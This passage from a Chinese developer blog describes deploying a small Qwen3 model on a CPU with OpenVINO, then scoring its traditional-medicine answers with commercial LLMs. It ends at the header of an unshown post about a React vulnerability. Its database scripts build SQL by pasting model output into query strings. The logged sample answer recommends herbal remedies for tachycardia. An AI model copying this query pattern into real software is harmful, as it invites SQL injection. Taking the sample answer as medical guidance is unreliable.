<p>当检测到  标签时进行状态切换，并丢弃标签内所有内容，直到检测到  标签结束。这实现了对思考内容的实时、零延迟拦截。</p>
<p>此外，代码中还提供两层额外保障：</p>
<ol>
<li>队列消费端 token.replace(THINK_END_TAG, '')，确保  标签不残留在流中。</li>
<li>get_clean_texts 中使用 re.sub(r'.*?', '', text, flags=re.DOTALL)，作为对最终完整输出的终极清理，捕获并移除任何意外残留的完整思考内容。</li>
</ol>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_clean_texts</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:
        text = self.generated_text
        <span class="hljs-comment"># 删除残留的 &lt;think&gt; 标签</span>
        text = re.sub(<span class="hljs-string">r'&lt;think&gt;.*?&lt;/think&gt;'</span>, <span class="hljs-string">''</span>, text, flags=re.DOTALL)
        <span class="hljs-comment"># 删除词停关键字</span>
        <span class="hljs-keyword">for</span> stop_str <span class="hljs-keyword">in</span> self.stop_strings:
            text = re.sub(re.escape(stop_str), <span class="hljs-string">''</span>, text, flags=re.I)
        text = re.sub(<span class="hljs-string">r'\n{3,}'</span>, <span class="hljs-string">'\n\n'</span>, text)
        <span class="hljs-keyword">return</span> text.strip()
</code></pre>
<p><em><strong>2.2.3.2 强制分块与语义平滑</strong></em></p>
<p>为了更好地检测到【EOA】终止符，强制设定了每次向队列发送数据的最小字符数。即使模型输出速度很快，内容也会被强制按 15 个字符左右的批次释放。然后就能够基于这 15 个字符一次性检测是否具有【EOA】终止符，若存在则终止输出。（这个也是小模型最麻烦的地方，输出不会“刹车”。不得已才采取这种实现方案）</p>
<p>此外，当 buffer 达到 chunk_size 后，代码会优先在缓冲区中寻找最近的标点符号 (。, ！, ？, ；, \n) 进行切分。这确保了输出的平滑性同时，尽量避免在句子中间硬性截断，提升了用户阅读体验。</p>
<p><em><strong>2.2.3.3 停止词检测与精确切除</strong></em></p>
<p>还记得上面展示过的 _stop_and_trim 函数吗？当检测到 stop_str（如 【EOA】）时，该方法会计算停止词的精确位置 (stop_pos)。它只将停止词之前的内容 (full_check_string[:stop_pos]) 发送到队列，并立即设置停止标志，确保停止词本身和其后的任何多余内容都不会进入最终输出，实现了干净的自停止。</p>
<h5 data-id="heading-9">2.2.4. 推理性能</h5>
<p>好了，现在就可以正式测试一下推理效果了，为此我编写了一个测试代码</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:

    logger.info(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
    logger.info(<span class="hljs-string">"Qwen3 0.6B OpenVINO Runtime 推理测试"</span>)
    logger.info(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)

    <span class="hljs-comment"># 为了跟 Optimum Intel 套件进行完整的对比，这里用回之前的提示词</span>
    input_prompt = <span class="hljs-string">"中医药理论是否能解释并解决全身乏力伴随心跳过速的症状？"</span>

    <span class="hljs-comment"># 计算 tokens 数</span>
    enc = tiktoken.get_encoding(<span class="hljs-string">"cl100k_base"</span>)

    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># 获取 runtime 实例</span>
        llm = OpenvinoRuntime()
        logger.info(<span class="hljs-string">f"提示词: <span class="hljs-subst">{input_prompt}</span>"</span>)
        logger.info(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
        full_response = <span class="hljs-string">""</span>
        token_count = <span class="hljs-number">0</span>
        start_time = time.time()
        
        <span class="hljs-comment"># 流式输出获取内容</span>
        <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> llm.transfor_stream_msg(input_prompt):
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> chunk[<span class="hljs-string">"finished"</span>]:
                <span class="hljs-built_in">print</span>(chunk[<span class="hljs-string">"content"</span>], end=<span class="hljs-string">""</span>, flush=<span class="hljs-literal">True</span>)
                full_response += chunk[<span class="hljs-string">"content"</span>]
                token_count += <span class="hljs-built_in">len</span>(enc.encode(chunk[<span class="hljs-string">"content"</span>]))
            <span class="hljs-keyword">else</span>:
                <span class="hljs-keyword">if</span> <span class="hljs-string">'full_response'</span> <span class="hljs-keyword">in</span> chunk:
                    final_text = chunk[<span class="hljs-string">'full_response'</span>]
                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> full_response:
                        <span class="hljs-built_in">print</span>(final_text)
                        token_count += <span class="hljs-built_in">len</span>(enc.encode(final_text))
        
        <span class="hljs-comment"># 记录结束时间进行耗时计算</span>
        end_time = time.time()
        duration = end_time - start_time
        logger.info(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
        logger.info(<span class="hljs-string">f"总用时: <span class="hljs-subst">{duration:<span class="hljs-number">.2</span>f}</span> 秒"</span>)
        logger.info(<span class="hljs-string">f"总生成 token 数: <span class="hljs-subst">{token_count}</span>"</span>)
        <span class="hljs-keyword">if</span> duration &gt; <span class="hljs-number">0</span>:
            logger.info(<span class="hljs-string">f"生成速率: <span class="hljs-subst">{token_count/duration:<span class="hljs-number">.2</span>f}</span> token/秒"</span>)
        logger.info(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        logger.error(<span class="hljs-string">f"主程序运行失败: <span class="hljs-subst">{e}</span>"</span>)
</code></pre>
<p>输出的结果如下：</p>
<pre><code class="hljs language-python" lang="python">...
[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">48</span>,<span class="hljs-number">828</span>]&lt;module&gt; - ============================================================
[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">48</span>,<span class="hljs-number">828</span>]&lt;module&gt; - Qwen3 <span class="hljs-number">0.6</span>B OpenVINO Runtime 推理测试
[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">48</span>,<span class="hljs-number">828</span>]&lt;module&gt; - ============================================================
[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">49</span>,027]_init_components - Loading model <span class="hljs-keyword">from</span> /Users/yuanzhenhui/Documents/document_file/tmp/trained_models/<span class="hljs-number">20251119</span>/OpenVINOModel/OVMS/qwen3-reasoning on CPU...
[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">53</span>,040]_init_components - Model loaded successfully (Mock)
[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">53</span>,040]_setup_generation_config - Generation config: do_sample=<span class="hljs-literal">False</span>, rep_penalty=<span class="hljs-number">1.2000000476837158</span>, max_tokens=<span class="hljs-number">300</span>
[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">53</span>,040]__init__ - OpenvinoRuntime initialized successfully
[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">53</span>,040]&lt;module&gt; - 提示词: 中医药理论是否能解释并解决全身乏力伴随心跳过速的症状？
[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">53</span>,040]&lt;module&gt; - ============================================================
从整体来看，全身性疲劳与心率加快在中医学上可以归结为“气虚血弱”或“阳气不足”的表现。这通常需要通过调整身体内环境来恢复平衡。推荐使用如黄芪、当归等补气养血药物进行治疗，并结合饮食调养（例如多食用含铁质的食物）以及适当运动以增强体质。同时，在专业医生指导下进行个性化管理及监测，确保安全有效。请勿自行用药。[注] 中医强调个体差异性和复杂系统作用机制，请具体诊断需由有经验的专业医疗人员完成。[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">59</span>,<span class="hljs-number">713</span>]&lt;module&gt; - ============================================================
[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">59</span>,<span class="hljs-number">713</span>]&lt;module&gt; - 总用时: <span class="hljs-number">6.67</span> 秒
[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">59</span>,<span class="hljs-number">713</span>]&lt;module&gt; - 总生成 token 数: <span class="hljs-number">228</span>
[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">59</span>,<span class="hljs-number">714</span>]&lt;module&gt; - 生成速率: <span class="hljs-number">34.17</span> token/秒
[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">59</span>,<span class="hljs-number">714</span>]&lt;module&gt; - ============================================================
</code></pre>
<p>与之前的 Optimum Intel 方案和 Llama.cpp 方案相比，GenAI 在性能上有明显的提升。本机 2 GHz 四核Intel Core i5 CPU 能有 34.17 token/秒是之前未曾尝试过的。若迁移到生产的 Linux 服务器稍微再调优一下应该能够满足一般前置推理要求。</p>
<h3 data-id="heading-10">3.问答验证</h3>
<p>既然已经完成了基于 CPU 的推理部署工作了，接下来时候验证推理的准确性了。</p>
<p>虽然 Unsloth 训练时用 1% 的数据进行验证，但这毕竟是基于数学层面的验证。在中文的语义语法上、表达上是否清晰、不含歧义...这只能够实际模拟一下才知道。但我并不是行业专家无法就推理结果进行判断，这个时候就需要商用大模型帮我完成这个判断、评估、打分的工作了。</p>
<h4 data-id="heading-11">3.1 生成问题</h4>
<p>有看过我博客的小伙伴又知道了，我之前曾经使用过 RAGChecker 为之前公司的推理应用做过评估。这次的验证也可以参考 RAGChecker 的处理流程，只不过为了“零投入”，使用“人工收集 + Python 数据处理脚本 + 多次分批处理 + 商用大模型”的模式进行处理：</p>
<p><strong>Step1</strong> 用商用大模型生成一定数量的问题（这次我就生成 5000 条不同类型的问题吧）</p>
<p><strong>Step2</strong> 使用需要评估的模型对这些问题进行作答，答案需要记录起来与问题一一对应</p>
<p><strong>Step3</strong> 将问题和答案都导出到 Excel 中，使用多个商用大模型对同一份 Excel 进行评分</p>
<p><strong>Step4</strong> 将所有评分记录重新导入数据库并采用平均分的方式获取最终评分</p>
<p>听上去好像没有什么毛病。好，那就立刻开干。</p>
<p>先导出常用的 183 种中药材名称并编写提示词让 Qwen3-MAX 帮我生成 5000 条不同的问题先。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37e78e566ca14b1fadd544a393bfbff3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2lkYeeahOi6uuW5s-Wwj-Wxiw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509763&amp;x-signature=wqHZeCYAJdvitlWkz4w48QKpKTU%3D" alt="" loading="lazy"/></p>
<p>为了保证问题的质量，这里加上联网搜索让生成出来的问题更加完整。此外，为了提高响应速度最终按每次 1000 条记录分批生成。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09181f32dbdd4d84856d2e86af9c7de0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2lkYeeahOi6uuW5s-Wwj-Wxiw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509763&amp;x-signature=sJy9uJbAeDmBVQS%2F52n3qqFHPGo%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-12">3.2 生成答案</h4>
<p>将 5000 条问题导入到 SQLite 后进行数据清洗，排重后 5000 条数据剩下 3370 条。</p>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">insert_all_validate_data_to_sqlite</span>(<span class="hljs-params">self</span>):
        
        <span class="hljs-comment"># 遍历目录下的所有 txt 文件</span>
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> os.listdir(self.dataset_path):
            <span class="hljs-keyword">if</span> <span class="hljs-string">'txt'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> i:
                <span class="hljs-keyword">continue</span>
            new_path = self.dataset_path + i   
            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(new_path, <span class="hljs-string">"r"</span>, encoding=<span class="hljs-string">"utf-8"</span>) <span class="hljs-keyword">as</span> f:
                <span class="hljs-keyword">try</span>:
                    loop_index = <span class="hljs-number">0</span>
                    
                    <span class="hljs-comment"># 打开文件遍历每一行，将其全部插入到 SQLite 中</span>
                    <span class="hljs-keyword">for</span> idx,line <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(f):
                        loop_index = idx
                        question = line.split(<span class="hljs-string">". "</span>)[<span class="hljs-number">1</span>]
                        data = {<span class="hljs-string">"question"</span>:question.strip()}
                        self.sql.insert(<span class="hljs-string">"check_dataset_qa"</span>,data)
                <span class="hljs-keyword">except</span>:
                    logger.info(<span class="hljs-string">f"error insert index: <span class="hljs-subst">{loop_index}</span>"</span>)
            logger.info(<span class="hljs-string">f"<span class="hljs-subst">{i}</span> inserted completed..."</span>)
            
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">clean_dulplicate_data</span>(<span class="hljs-params">self</span>):

        <span class="hljs-comment"># 分组查询获取重复问题的最大 id 值</span>
        sql = <span class="hljs-string">"select question,max(id) id from check_dataset_qa group by question having count(1) &gt; 1"</span>
        results = self.sql.fetch_all(sql)
        <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(results) &gt; <span class="hljs-number">0</span>:

            <span class="hljs-comment"># 删除重复数据</span>
            ids = [result[<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> result <span class="hljs-keyword">in</span> results]
            ids_str = <span class="hljs-string">','</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, ids))
            del_sql = <span class="hljs-string">f"delete from check_dataset_qa where id in (<span class="hljs-subst">{ids_str}</span>)"</span>
            self.sql.execute(del_sql)
            results = self.sql.fetch_all(sql)
        logger.info(<span class="hljs-string">f"delete dulpicate data completed..."</span>)
</code></pre>
<p>遍历 3370 条记录并将“问题”提交给 0.6B 进行回答推理</p>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_answers</span>(<span class="hljs-params">self</span>):

        <span class="hljs-comment"># 初始化 openvino 对象</span>
        ort = OpenvinoRuntime()
        sql = <span class="hljs-string">"SELECT id,question FROM check_dataset_qa WHERE answer IS NULL LIMIT 10"</span>
        results = self.sql.fetch_all(sql)
        batch_count = <span class="hljs-number">0</span>
        <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(results) &gt; <span class="hljs-number">0</span>:

            <span class="hljs-comment"># 分批次遍历获取问题和对应的 id 值</span>
            <span class="hljs-keyword">for</span> <span class="hljs-built_in">id</span>,question <span class="hljs-keyword">in</span> results:
                answer = <span class="hljs-string">""</span>

                <span class="hljs-comment"># 推理流式返回，将所有回答收集起来</span>
                <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> ort.transfor_stream_msg(question):
                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> chunk[<span class="hljs-string">"finished"</span>]:
                        answer += chunk[<span class="hljs-string">"content"</span>]
                    <span class="hljs-keyword">else</span>:
                        <span class="hljs-keyword">if</span> <span class="hljs-string">'full_response'</span> <span class="hljs-keyword">in</span> chunk:
                            final_text = chunk[<span class="hljs-string">'full_response'</span>]
                            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> answer:
                                answer += final_text

                <span class="hljs-comment"># 最后根据 id 进行回答字段的更新</span>
                update_sql = <span class="hljs-string">f"UPDATE check_dataset_qa SET answer = '<span class="hljs-subst">{answer}</span>' WHERE id = <span class="hljs-subst">{<span class="hljs-built_in">id</span>}</span>"</span>
                self.sql.execute(update_sql)
                logger.info(<span class="hljs-string">f"Update id: <span class="hljs-subst">{<span class="hljs-built_in">id</span>}</span> completed..."</span>)
            results = self.sql.fetch_all(sql)
            batch_count += <span class="hljs-number">1</span>
            logger.info(<span class="hljs-string">f"Generate batch <span class="hljs-subst">{batch_count}</span> answers completed..."</span>)
</code></pre>
<h4 data-id="heading-13">3.3 导出 CSV 并用大模型评分（Qwen3-MAX、DeepSeek 和 KIMI 2）</h4>
<p>已回答的记录分批导出成 CSV 文件并提交给商用大模型进行评分，以下以 DeepSeek 界面为例：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a45bd7cc225545058c2bf115d9f3b6c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2lkYeeahOi6uuW5s-Wwj-Wxiw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509763&amp;x-signature=a9IrEmcbtMck07l4MM9f7O4B4Mc%3D" alt="" loading="lazy"/></p>
<p>如上图所示，提示词中让商用大模型直接返回 id 和评分的 JSON 数据，这样就方便我们进行数据库字段更新了。（这里因为要做到零成本所以没有调用 API 接口，而是通过文档导入导出的方式，在 Web 端获取结果）</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf2d234c15bb4af48b526a9f2fbc047a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2lkYeeahOi6uuW5s-Wwj-Wxiw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509763&amp;x-signature=POyYODmyIBZ14u6PpHhIoyqgJcQ%3D" alt="" loading="lazy"/></p>
<p>将 Web 端返回的结果制作成 json 文件，并导入到 SQLite</p>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">load_json_and_update_sqlite</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> os.listdir(self.score_path):
            new_path = self.score_path + i
            <span class="hljs-built_in">type</span> = i.split(<span class="hljs-string">"."</span>)[<span class="hljs-number">0</span>]  
            json_data = CommonUtil.load_json_file(new_path)
            <span class="hljs-keyword">for</span> json_obj <span class="hljs-keyword">in</span> json_data:
                <span class="hljs-built_in">id</span> = json_obj[<span class="hljs-string">'id'</span>]
                score = json_obj[<span class="hljs-string">'score'</span>]
                update_sql = <span class="hljs-string">f"update check_dataset_qa set <span class="hljs-subst">{<span class="hljs-built_in">type</span>}</span>_score = <span class="hljs-subst">{score}</span> where id = <span class="hljs-subst">{<span class="hljs-built_in">id</span>}</span>"</span>
                self.sql.execute(update_sql)
                logger.info(<span class="hljs-string">f"Update id: <span class="hljs-subst">{<span class="hljs-built_in">id</span>}</span> completed..."</span>)
                
            logger.info(<span class="hljs-string">f"<span class="hljs-subst">{<span class="hljs-built_in">type</span>}</span> inserted completed..."</span>)
</code></pre>
<h4 data-id="heading-14">3.4 汇总评分（全 SQL 操作）</h4>
<p>待全部分数导入完毕后，就可以计算每条记录的大模型平均分了，有了每条记录的平均分就可以计算整体回答质量的平均分。如下图所示：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a75576ba482c4aeb9d0531348ddf023a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2lkYeeahOi6uuW5s-Wwj-Wxiw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509763&amp;x-signature=GvPSHnRScy%2F0SjAbhH12VUGVhIY%3D" alt="" loading="lazy"/></p>
<p>最终，整个模型评分为 6.607。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4bd046781b742bf8e78a28474299577~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2lkYeeahOi6uuW5s-Wwj-Wxiw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509763&amp;x-signature=7DAECnvuxRV5B6f63LfyZNv%2BXb4%3D" alt="" loading="lazy"/></p>
<p>整体质量在合格线之上，评分等级数据统计如下：</p>





























<table><thead><tr><th>平均分</th><th>占比</th></tr></thead><tbody><tr><td>&lt;6</td><td>2.67%</td></tr><tr><td>&gt;=6  and  &lt;7</td><td>36.87%</td></tr><tr><td>&gt;=7  and  &lt;8</td><td>57.32%</td></tr><tr><td>&gt;=8  and  &lt;9</td><td>3.12%</td></tr><tr><td>&gt;=9</td><td>0%</td></tr></tbody></table>
<p>通过表格可知，推理返回结果基本能贴题但不够全面，侧面说明训练数据“面”还不够广。并且经抽查发现推理结果含有大量“杂音”，这说明还需要在训练精度和提示词上下点功夫才行。</p>
<p>总的来说就是资源（数据、硬件、时间等）还不够，就当前结果而言个人觉得已经在能力范围内做到最好了。</p>
<p>直到模型使用 CPU 方案落地的那一刻为止目前还没有用过一分钱（严格坚守自己的原则），后续只要继续优化调整即可。</p>
<p>坦白说，虽然最终未能实现思考链推理有点遗憾，但性能和质量的确是上来了（相比上一年的 Qwen1.5 版本）。每次跨越一小步就可以了，毕竟个人力量怎能与企业集团相比呢。</p>
<p>如果没有办法做多轮精准应答，那么可以改变策略，做边缘推理也行。就像我上面说的那样，可以考虑将这个模型放入 APP 里面。用户可以在本地算力下做一些简短的推理，之后再根据业务需求决定是否发送到云端进行深层推理。那这就能做很多东西了...</p>
<p>好了，以上就是本章分享的全部内容了，代码均发布到 brain-mix 项目中，欢迎各位的指导。</p>
<p>gitee：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fyzh0623%2Fbrain-mix" target="_blank" title="https://gitee.com/yzh0623/brain-mix" ref="nofollow noopener noreferrer">gitee.com/yzh0623/bra…</a></p>
<p>github：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fyzh0623%2Fbrain-mix" target="_blank" title="https://github.com/yzh0623/brain-mix" ref="nofollow noopener noreferrer">github.com/yzh0623/bra…</a></p>
<p>（未完待续...）</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入探究 React 史上最大安全漏洞]]></title>    <link>https://juejin.cn/post/7579892222609293347</link>    <guid>https://juejin.cn/post/7579892222609293347</guid>    <pubDate>2025-12-05T03:44:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579892222609293347" data-draft-id="7579887768227774498" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入探究 React 史上最大安全漏洞"/> <meta itemprop="keywords" content="前端,React.js,Next.js"/> <meta itemprop="datePublished" content="2025-12-05T03:44:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="锈儿海老师"/> <meta itemprop="url" content="https://juejin.cn/user/1814619113927805"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入探究 React 史上最大安全漏洞
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1814619113927805/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    锈儿海老师
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:44:12.000Z" title="Fri Dec 05 2025 03:44:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 